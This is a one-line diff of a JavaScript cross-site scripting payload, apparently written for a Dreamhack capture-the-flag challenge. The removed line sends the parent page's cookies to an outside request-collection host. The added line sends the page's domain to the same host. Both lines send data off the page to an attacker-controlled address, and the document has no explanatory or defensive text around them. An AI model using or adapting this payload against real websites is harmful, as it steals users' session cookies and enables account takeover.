@@ -1,1 +1,1 @@
-location.href = "https://tmjposx.request.dreamhack.games?c=" + encodeURIComponent(parent.document.cookie);
+location.href = "https://tmjposx.request.dreamhack.games?c=" + encodeURIComponent(document.domain);
